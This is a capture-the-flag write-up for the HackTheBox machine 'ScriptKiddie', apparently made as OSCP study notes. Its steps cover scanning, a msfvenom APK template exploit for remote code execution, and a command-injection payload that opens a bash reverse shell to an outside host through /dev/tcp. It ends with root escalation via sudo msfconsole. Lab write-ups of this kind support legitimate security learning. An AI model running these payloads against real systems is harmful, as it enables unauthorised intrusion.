## ScriptKiddie

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.226 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/3580cfc6-f20d-44ac-8b29-3031b3f4b68e)

<br>

The website has some functions using nmap, msfvenom and searchsploits.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/4f0f4e39-6b6c-4bc0-adc1-0f17a86ca4c8)

<br>

Searching for msfvenom exploit, there is this one:

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/d3a2c527-4575-4070-9776-ae9bbc5b9f36)

<br>

Running the exploit, we generate an apk file that can be used as template in the website to get a RCE. Just modify the content of the exploit to get a reverse shell with curl.

![exploitChanges](https://github.com/b1d0ws/OSCP/assets/58514930/c5a34db1-ad6f-4591-a28e-4de093ecd5f4)

![usingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/7ed575c4-6615-4ffc-bcb0-afe61c9239f1)

![websiteExploit](https://github.com/b1d0ws/OSCP/assets/58514930/76e49179-0769-46f1-9b3f-8ccb6e3b93ea)

![gettingRevshell](https://github.com/b1d0ws/OSCP/assets/58514930/c5934448-4165-469f-8429-d0f03a45fb94)

### Root Flag

#### Pwn User

Inside pwn home, there is a script that reads the content of /home/kid/logs/hackers.

You can inject content in this file to do command injection on ${ip} variable, but you need to add 2 fields before the payload because of the "cut -d' ' -f3-" part of the script.

```
THE SCRIPT
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

PAYLOAD
echo -n "A Z 10.10.14.11 30;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/2222 0>&1' #" > /home/kid/logs/hackers
```

![scanLosers](https://github.com/b1d0ws/OSCP/assets/58514930/f1879d94-ed25-473f-ab96-79b4e0e1d319)

![pwnPayload](https://github.com/b1d0ws/OSCP/assets/58514930/74222c41-860f-46af-9870-18366d2b338a)

#### Root Privilege Escalation
```
sudo -l
(root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

sudo /opt/metasploit-framework-6.0.9/msfconsole

# Option 1
irb
system("/bin/sh")

# Option 2
/bin/bash
```
![sudo -l](https://github.com/b1d0ws/OSCP/assets/58514930/d85ce948-6fe1-4eff-a6f0-859572e3bbf7)

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/dabd1f25-c83a-4d0f-85be-459969d554a6)
